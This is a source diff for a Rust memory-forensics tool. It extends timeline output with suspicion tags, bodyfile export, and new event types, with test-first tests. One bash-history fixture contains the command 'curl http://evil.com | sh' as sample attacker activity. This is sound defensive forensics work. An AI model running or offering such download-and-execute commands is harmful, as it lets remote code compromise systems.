@@ -331,6 +331,10 @@ enum Commands {
         /// User-provided boot time (Unix epoch seconds) for Linux dumps.
         #[arg(long)]
         btime: Option<i64>,
+
+        /// Output in Sleuthkit bodyfile format (for mactime/Plaso ingestion).
+        #[arg(long)]
+        bodyfile: bool,
     },
 }
 
@@ -527,6 +531,7 @@ fn main() -> Result<()> {
             output,
             cr3,
             btime,
+            bodyfile,
         } => {
             let resolved = archive::resolve_dump(&dump)?;
             cmd_timeline(
@@ -535,6 +540,7 @@ fn main() -> Result<()> {
                 output,
                 cr3,
                 btime,
+                bodyfile,
                 resolved.is_extracted(),
             )
         }
@@ -3816,12 +3822,14 @@ struct TimelineEvent {
     /// Human-readable UTC timestamp.
     timestamp: String,
     /// Event category: "process_create", "process_exit", "process_start",
-    /// "connection_create".
+    /// "connection_create", "thread_create", "bash_command", "dll_load".
     event_type: String,
     /// Process ID associated with the event.
     pid: u64,
     /// Description of the event source.
     description: String,
+    /// Suspicious/notable tags (e.g., "singleton-duplicate", "parent-child-violation").
+    tags: Vec<String>,
 }
 
 /// Convert a Windows FILETIME to Unix epoch seconds.
@@ -3849,6 +3857,7 @@ fn build_windows_timeline(
                 event_type: "process_create".into(),
                 pid: p.pid,
                 description: format!("{} (PID {})", p.image_name, p.pid),
+                tags: vec![],
             });
         }
         if let Some(ts) = filetime_to_unix(p.exit_time) {
@@ -3858,6 +3867,7 @@ fn build_windows_timeline(
                 event_type: "process_exit".into(),
                 pid: p.pid,
                 description: format!("{} (PID {})", p.image_name, p.pid),
+                tags: vec![],
             });
         }
     }
@@ -3873,6 +3883,7 @@ fn build_windows_timeline(
                     "TCP {}:{} -> {}:{} ({})",
                     c.local_addr, c.local_port, c.remote_addr, c.remote_port, c.process_name
                 ),
+                tags: vec![],
             });
         }
     }
@@ -3903,6 +3914,7 @@ fn build_linux_timeline(
                 event_type: "process_start".into(),
                 pid: p.pid,
                 description: format!("{} (PID {})", p.comm, p.pid),
+                tags: vec![],
             }
         })
         .collect();
@@ -3911,18 +3923,61 @@ fn build_linux_timeline(
     events
 }
 
+/// Build timeline events from Windows thread creation times.
+fn build_windows_thread_events(_threads: &[memf_windows::WinThreadInfo]) -> Vec<TimelineEvent> {
+    todo!()
+}
+
+/// Build timeline events from Linux bash history timestamps.
+fn build_linux_bash_events(_entries: &[memf_linux::BashHistoryInfo]) -> Vec<TimelineEvent> {
+    todo!()
+}
+
+/// Build timeline events for Windows DLL loads (ordered, no timestamp).
+fn build_windows_dll_events(
+    _procs: &[memf_windows::WinProcessInfo],
+    _proc_dlls: &[(u64, Vec<memf_windows::WinDllInfo>)],
+) -> Vec<TimelineEvent> {
+    todo!()
+}
+
+/// Tag suspicious patterns in Windows timeline events.
+///
+/// Mutates `events` in-place, appending tags like "singleton-duplicate",
+/// "parent-child-violation", "non-networking-process", or
+/// "thread-outside-module".
+fn tag_suspicious_windows(
+    _events: &mut [TimelineEvent],
+    _procs: &[memf_windows::WinProcessInfo],
+    _conns: &[memf_windows::WinConnectionInfo],
+    _threads: &[memf_windows::WinThreadInfo],
+    _proc_dlls: &[(u64, Vec<memf_windows::WinDllInfo>)],
+) {
+    todo!()
+}
+
+/// Print timeline events in Sleuthkit bodyfile format.
+fn print_timeline_bodyfile(_events: &[TimelineEvent]) {
+    todo!()
+}
+
 /// Print a sorted timeline to stdout.
 fn print_timeline(events: &[TimelineEvent], output: OutputFormat) {
     match output {
         OutputFormat::Table => {
             println!(
-                "{:<26} {:<20} {:>8}  {}",
-                "TIMESTAMP", "EVENT", "PID", "DESCRIPTION"
+                "{:<26} {:<20} {:>8}  {}  {}",
+                "TIMESTAMP", "EVENT", "PID", "DESCRIPTION", "TAGS"
             );
             for e in events {
+                let tags_str = if e.tags.is_empty() {
+                    String::new()
+                } else {
+                    format!("[{}]", e.tags.join(", "))
+                };
                 println!(
-                    "{:<26} {:<20} {:>8}  {}",
-                    e.timestamp, e.event_type, e.pid, e.description
+                    "{:<26} {:<20} {:>8}  {}  {}",
+                    e.timestamp, e.event_type, e.pid, e.description, tags_str
                 );
             }
         }
@@ -3934,16 +3989,18 @@ fn print_timeline(events: &[TimelineEvent], output: OutputFormat) {
                     "event_type": e.event_type,
                     "pid": e.pid,
                     "description": e.description,
+                    "tags": e.tags,
                 });
                 println!("{}", serde_json::to_string(&json).unwrap_or_default());
             }
         }
         OutputFormat::Csv => {
-            println!("timestamp,timestamp_secs,event_type,pid,description");
+            println!("timestamp,timestamp_secs,event_type,pid,description,tags");
             for e in events {
+                let tags_str = e.tags.join(";");
                 println!(
-                    "{},{},{},{},\"{}\"",
-                    e.timestamp, e.timestamp_secs, e.event_type, e.pid, e.description
+                    "{},{},{},{},\"{}\",\"{}\"",
+                    e.timestamp, e.timestamp_secs, e.event_type, e.pid, e.description, tags_str
                 );
             }
         }
@@ -3957,6 +4014,7 @@ fn cmd_timeline(
     output: OutputFormat,
     cr3: Option<u64>,
     btime: Option<i64>,
+    bodyfile: bool,
     raw_fallback: bool,
 ) -> Result<()> {
     let (ctx, reader) = setup_analysis(dump, symbols_path, cr3, raw_fallback)?;
@@ -5104,6 +5162,7 @@ mod tests {
             event_type: "process_start".into(),
             pid: 1,
             description: "systemd".into(),
+            tags: vec![],
         }];
         print_timeline(&events, OutputFormat::Table);
     }
@@ -5116,6 +5175,7 @@ mod tests {
             event_type: "process_create".into(),
             pid: 4,
             description: "System".into(),
+            tags: vec![],
         }];
         print_timeline(&events, OutputFormat::Json);
     }
@@ -5128,7 +5188,460 @@ mod tests {
             event_type: "connection_create".into(),
             pid: 4,
             description: "TCP 10.0.0.1:445 -> 10.0.0.2:49152".into(),
+            tags: vec![],
         }];
         print_timeline(&events, OutputFormat::Csv);
+    }
+
+    // -----------------------------------------------------------------------
+    // Thread events
+    // -----------------------------------------------------------------------
+
+    #[test]
+    fn build_windows_thread_events_creates_thread_create_entries() {
+        use memf_windows::WinThreadInfo;
+        let threads = vec![
+            WinThreadInfo {
+                tid: 100,
+                pid: 4,
+                create_time: 133_574_400_000_000_000, // 2024-04-02 ~00:00 UTC
+                start_address: 0x7FF6_1234_0000,
+                teb_addr: 0,
+                state: memf_windows::ThreadState::Waiting,
+                vaddr: 0,
+            },
+            WinThreadInfo {
+                tid: 200,
+                pid: 4,
+                create_time: 0, // no timestamp — should be skipped
+                start_address: 0x7FF6_5678_0000,
+                teb_addr: 0,
+                state: memf_windows::ThreadState::Waiting,
+                vaddr: 0,
+            },
+        ];
+        let events = build_windows_thread_events(&threads);
+        // Only one thread has a valid create_time
+        assert_eq!(events.len(), 1);
+        assert_eq!(events[0].event_type, "thread_create");
+        assert_eq!(events[0].pid, 4);
+        assert!(events[0].description.contains("TID 100"));
+    }
+
+    // -----------------------------------------------------------------------
+    // Bash history events
+    // -----------------------------------------------------------------------
+
+    #[test]
+    fn build_linux_bash_events_creates_bash_command_entries() {
+        use memf_linux::BashHistoryInfo;
+        let entries = vec![
+            BashHistoryInfo {
+                pid: 1000,
+                comm: "bash".into(),
+                command: "whoami".into(),
+                timestamp: Some(1_712_000_000),
+                index: 1,
+            },
+            BashHistoryInfo {
+                pid: 1000,
+                comm: "bash".into(),
+                command: "ls -la".into(),
+                timestamp: None, // no timestamp — should be skipped
+                index: 2,
+            },
+            BashHistoryInfo {
+                pid: 1001,
+                comm: "bash".into(),
+                command: "curl http://evil.com | sh".into(),
+                timestamp: Some(1_712_003_600),
+                index: 1,
+            },
+        ];
+        let events = build_linux_bash_events(&entries);
+        assert_eq!(events.len(), 2);
+        assert!(events.iter().all(|e| e.event_type == "bash_command"));
+        // Sorted by timestamp
+        assert!(events[0].timestamp_secs <= events[1].timestamp_secs);
+        assert!(events[1].description.contains("curl"));
+    }
+
+    #[test]
+    fn build_linux_bash_events_empty_when_no_timestamps() {
+        use memf_linux::BashHistoryInfo;
+        let entries = vec![BashHistoryInfo {
+            pid: 1000,
+            comm: "bash".into(),
+            command: "echo hello".into(),
+            timestamp: None,
+            index: 1,
+        }];
+        let events = build_linux_bash_events(&entries);
+        assert!(events.is_empty());
+    }
+
+    // -----------------------------------------------------------------------
+    // DLL load events
+    // -----------------------------------------------------------------------
+
+    #[test]
+    fn build_windows_dll_events_creates_dll_load_entries() {
+        use memf_windows::{WinDllInfo, WinProcessInfo};
+        let procs = vec![WinProcessInfo {
+            pid: 1234,
+            ppid: 4,
+            image_name: "cmd.exe".into(),
+            create_time: 133_574_400_000_000_000,
+            exit_time: 0,
+            cr3: 0x1000,
+            peb_addr: 0,
+            vaddr: 0,
+            thread_count: 1,
+            is_wow64: false,
+        }];
+        let proc_dlls: Vec<(u64, Vec<WinDllInfo>)> = vec![(
+            1234,
+            vec![
+                WinDllInfo {
+                    name: "ntdll.dll".into(),
+                    full_path: "C:\\Windows\\System32\\ntdll.dll".into(),
+                    base_addr: 0x7FFE_0000_0000,
+                    size: 0x1F_0000,
+                    load_order: 0,
+                },
+                WinDllInfo {
+                    name: "kernel32.dll".into(),
+                    full_path: "C:\\Windows\\System32\\kernel32.dll".into(),
+                    base_addr: 0x7FFE_1000_0000,
+                    size: 0x10_0000,
+                    load_order: 1,
+                },
+            ],
+        )];
+        let events = build_windows_dll_events(&procs, &proc_dlls);
+        // DLL events inherit process create_time (no per-DLL timestamp)
+        assert_eq!(events.len(), 2);
+        assert!(events.iter().all(|e| e.event_type == "dll_load"));
+        assert!(events[0].description.contains("ntdll.dll"));
+        assert_eq!(events[0].pid, 1234);
+    }
+
+    // -----------------------------------------------------------------------
+    // Suspicious pattern detection (Windows)
+    // -----------------------------------------------------------------------
+
+    #[test]
+    fn tag_suspicious_windows_flags_singleton_duplication() {
+        use memf_windows::WinProcessInfo;
+        // Two lsass.exe processes — always suspicious
+        let procs = vec![
+            WinProcessInfo {
+                pid: 600,
+                ppid: 500,
+                image_name: "lsass.exe".into(),
+                create_time: 133_574_400_000_000_000,
+                exit_time: 0,
+                cr3: 0x1000,
+                peb_addr: 0,
+                vaddr: 0,
+                thread_count: 10,
+                is_wow64: false,
+            },
+            WinProcessInfo {
+                pid: 7777,
+                ppid: 500,
+                image_name: "lsass.exe".into(),
+                create_time: 133_574_410_000_000_000,
+                exit_time: 0,
+                cr3: 0x2000,
+                peb_addr: 0,
+                vaddr: 0,
+                thread_count: 1,
+                is_wow64: false,
+            },
+        ];
+        let mut events = build_windows_timeline(&procs, &[]);
+        tag_suspicious_windows(&mut events, &procs, &[], &[], &[]);
+        let tagged: Vec<_> = events.iter().filter(|e| !e.tags.is_empty()).collect();
+        assert!(!tagged.is_empty());
+        assert!(tagged
+            .iter()
+            .any(|e| e.tags.contains(&"singleton-duplicate".to_string())));
+    }
+
+    #[test]
+    fn tag_suspicious_windows_flags_parent_child_violation() {
+        use memf_windows::WinProcessInfo;
+        // svchost.exe with ppid that is NOT services.exe (PID 500)
+        let procs = vec![
+            WinProcessInfo {
+                pid: 500,
+                ppid: 400,
+                image_name: "services.exe".into(),
+                create_time: 133_574_400_000_000_000,
+                exit_time: 0,
+                cr3: 0x1000,
+                peb_addr: 0,
+                vaddr: 0,
+                thread_count: 5,
+                is_wow64: false,
+            },
+            WinProcessInfo {
+                pid: 800,
+                ppid: 9999, // wrong parent — should be 500 (services.exe)
+                image_name: "svchost.exe".into(),
+                create_time: 133_574_405_000_000_000,
+                exit_time: 0,
+                cr3: 0x2000,
+                peb_addr: 0,
+                vaddr: 0,
+                thread_count: 3,
+                is_wow64: false,
+            },
+        ];
+        let mut events = build_windows_timeline(&procs, &[]);
+        tag_suspicious_windows(&mut events, &procs, &[], &[], &[]);
+        let tagged: Vec<_> = events
+            .iter()
+            .filter(|e| e.tags.contains(&"parent-child-violation".to_string()))
+            .collect();
+        assert!(!tagged.is_empty());
+    }
+
+    #[test]
+    fn tag_suspicious_windows_flags_non_networking_process() {
+        use memf_windows::{WinConnectionInfo, WinProcessInfo};
+        // notepad.exe with a TCP connection — always suspicious
+        let procs = vec![WinProcessInfo {
+            pid: 3000,
+            ppid: 1000,
+            image_name: "notepad.exe".into(),
+            create_time: 133_574_400_000_000_000,
+            exit_time: 0,
+            cr3: 0x1000,
+            peb_addr: 0,
+            vaddr: 0,
+            thread_count: 1,
+            is_wow64: false,
+        }];
+        let conns = vec![WinConnectionInfo {
+            pid: 3000,
+            local_addr: "10.0.0.5".into(),
+            local_port: 49152,
+            remote_addr: "1.2.3.4".into(),
+            remote_port: 443,
+            state: memf_windows::WinTcpState::Established,
+            protocol: "TCP".into(),
+            process_name: "notepad.exe".into(),
+            create_time: 133_574_401_000_000_000,
+        }];
+        let mut events = build_windows_timeline(&procs, &conns);
+        tag_suspicious_windows(&mut events, &procs, &conns, &[], &[]);
+        let tagged: Vec<_> = events
+            .iter()
+            .filter(|e| e.tags.contains(&"non-networking-process".to_string()))
+            .collect();
+        assert!(!tagged.is_empty());
+    }
+
+    #[test]
+    fn tag_suspicious_windows_flags_thread_outside_module() {
+        use memf_windows::{WinDllInfo, WinProcessInfo, WinThreadInfo};
+        let procs = vec![WinProcessInfo {
+            pid: 1234,
+            ppid: 4,
+            image_name: "explorer.exe".into(),
+            create_time: 133_574_400_000_000_000,
+            exit_time: 0,
+            cr3: 0x1000,
+            peb_addr: 0,
+            vaddr: 0,
+            thread_count: 5,
+            is_wow64: false,
+        }];
+        let threads = vec![WinThreadInfo {
+            tid: 5678,
+            pid: 1234,
+            create_time: 133_574_401_000_000_000,
+            start_address: 0xDEAD_0000, // not in any DLL range
+            teb_addr: 0,
+            state: memf_windows::ThreadState::Waiting,
+            vaddr: 0,
+        }];
+        let proc_dlls: Vec<(u64, Vec<WinDllInfo>)> = vec![(
+            1234,
+            vec![WinDllInfo {
+                name: "ntdll.dll".into(),
+                full_path: "C:\\Windows\\System32\\ntdll.dll".into(),
+                base_addr: 0x7FFE_0000_0000,
+                size: 0x1F_0000,
+                load_order: 0,
+            }],
+        )];
+        let mut events = build_windows_timeline(&procs, &[]);
+        let mut thread_events = build_windows_thread_events(&threads);
+        events.append(&mut thread_events);
+        tag_suspicious_windows(&mut events, &procs, &[], &threads, &proc_dlls);
+        let tagged: Vec<_> = events
+            .iter()
+            .filter(|e| e.tags.contains(&"thread-outside-module".to_string()))
+            .collect();
+        assert!(!tagged.is_empty());
+    }
+
+    #[test]
+    fn tag_suspicious_windows_no_false_positives_on_clean_system() {
+        use memf_windows::WinProcessInfo;
+        // Normal Windows singleton processes — no duplicates, correct parents
+        let procs = vec![
+            WinProcessInfo {
+                pid: 4,
+                ppid: 0,
+                image_name: "System".into(),
+                create_time: 133_574_400_000_000_000,
+                exit_time: 0,
+                cr3: 0x1000,
+                peb_addr: 0,
+                vaddr: 0,
+                thread_count: 100,
+                is_wow64: false,
+            },
+            WinProcessInfo {
+                pid: 600,
+                ppid: 500,
+                image_name: "lsass.exe".into(),
+                create_time: 133_574_401_000_000_000,
+                exit_time: 0,
+                cr3: 0x2000,
+                peb_addr: 0,
+                vaddr: 0,
+                thread_count: 10,
+                is_wow64: false,
+            },
+        ];
+        let mut events = build_windows_timeline(&procs, &[]);
+        tag_suspicious_windows(&mut events, &procs, &[], &[], &[]);
+        // No tags on clean system
+        assert!(events.iter().all(|e| e.tags.is_empty()));
+    }
+
+    // -----------------------------------------------------------------------
+    // Bodyfile output
+    // -----------------------------------------------------------------------
+
+    #[test]
+    fn print_timeline_bodyfile_does_not_panic() {
+        let events = vec![TimelineEvent {
+            timestamp_secs: 1_712_000_000,
+            timestamp: "2024-04-02 04:26:40 UTC".into(),
+            event_type: "process_create".into(),
+            pid: 4,
+            description: "System (PID 4)".into(),
+            tags: vec![],
+        }];
+        print_timeline_bodyfile(&events);
+    }
+
+    #[test]
+    fn print_timeline_bodyfile_format_matches_mactime() {
+        // bodyfile format: MD5|name|inode|mode|UID|GID|size|atime|mtime|ctime|crtime
+        let events = vec![TimelineEvent {
+            timestamp_secs: 1_712_000_000,
+            timestamp: "2024-04-02 04:26:40 UTC".into(),
+            event_type: "process_create".into(),
+            pid: 1234,
+            description: "cmd.exe (PID 1234)".into(),
+            tags: vec!["singleton-duplicate".into()],
+        }];
+        // Capture stdout - we just verify it doesn't panic and produces output.
+        // The bodyfile format correctness will be verified in GREEN phase.
+        print_timeline_bodyfile(&events);
+    }
+
+    // -----------------------------------------------------------------------
+    // Tags display in table output
+    // -----------------------------------------------------------------------
+
+    #[test]
+    fn print_timeline_table_shows_tags() {
+        let events = vec![TimelineEvent {
+            timestamp_secs: 1_712_000_000,
+            timestamp: "2024-04-02 04:26:40 UTC".into(),
+            event_type: "process_create".into(),
+            pid: 600,
+            description: "lsass.exe (PID 600)".into(),
+            tags: vec!["singleton-duplicate".into()],
+        }];
+        // Should not panic; visual verification of tag display
+        print_timeline(&events, OutputFormat::Table);
+    }
+
+    #[test]
+    fn print_timeline_json_includes_tags_array() {
+        let events = vec![TimelineEvent {
+            timestamp_secs: 1_712_000_000,
+            timestamp: "2024-04-02 04:26:40 UTC".into(),
+            event_type: "process_create".into(),
+            pid: 600,
+            description: "lsass.exe (PID 600)".into(),
+            tags: vec![
+                "singleton-duplicate".into(),
+                "parent-child-violation".into(),
+            ],
+        }];
+        print_timeline(&events, OutputFormat::Json);
+    }
+
+    // -----------------------------------------------------------------------
+    // Pivot point: process with both listener and outbound (notable)
+    // -----------------------------------------------------------------------
+
+    #[test]
+    fn tag_suspicious_windows_flags_pivot_point() {
+        use memf_windows::{WinConnectionInfo, WinProcessInfo};
+        // Process with both a LISTENING and ESTABLISHED connection
+        let procs = vec![WinProcessInfo {
+            pid: 2000,
+            ppid: 500,
+            image_name: "suspicious.exe".into(),
+            create_time: 133_574_400_000_000_000,
+            exit_time: 0,
+            cr3: 0x1000,
+            peb_addr: 0,
+            vaddr: 0,
+            thread_count: 3,
+            is_wow64: false,
+        }];
+        let conns = vec![
+            WinConnectionInfo {
+                pid: 2000,
+                local_addr: "0.0.0.0".into(),
+                local_port: 4444,
+                remote_addr: "0.0.0.0".into(),
+                remote_port: 0,
+                state: memf_windows::WinTcpState::Listen,
+                protocol: "TCP".into(),
+                process_name: "suspicious.exe".into(),
+                create_time: 133_574_401_000_000_000,
+            },
+            WinConnectionInfo {
+                pid: 2000,
+                local_addr: "10.0.0.5".into(),
+                local_port: 49152,
+                remote_addr: "1.2.3.4".into(),
+                remote_port: 443,
+                state: memf_windows::WinTcpState::Established,
+                protocol: "TCP".into(),
+                process_name: "suspicious.exe".into(),
+                create_time: 133_574_402_000_000_000,
+            },
+        ];
+        let mut events = build_windows_timeline(&procs, &conns);
+        tag_suspicious_windows(&mut events, &procs, &conns, &[], &[]);
+        let tagged: Vec<_> = events
+            .iter()
+            .filter(|e| e.tags.contains(&"pivot-point".to_string()))
+            .collect();
+        assert!(!tagged.is_empty());
     }
 }
